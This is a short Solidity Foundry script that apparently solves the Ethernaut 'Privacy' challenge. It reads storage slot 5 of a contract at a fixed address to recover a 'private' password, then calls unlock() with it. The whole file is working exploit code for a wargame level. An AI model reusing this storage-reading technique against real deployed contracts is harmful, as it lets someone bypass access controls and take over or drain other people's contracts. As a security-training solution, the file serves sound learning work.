// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {Telephone} from "../../src/Ethernaut/Telephone.sol";
import {Privacy} from "../../src/Ethernaut/Privacy.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Privacy privacy = Privacy(0x79E8c1C09730ea7aAC015f1dd6bE185008d9718F);
        bytes32 password = vm.load(
            0x79E8c1C09730ea7aAC015f1dd6bE185008d9718F,
            bytes32(uint256(5))
        );
        privacy.unlock(bytes16(password));
        vm.stopBroadcast();
    }
}
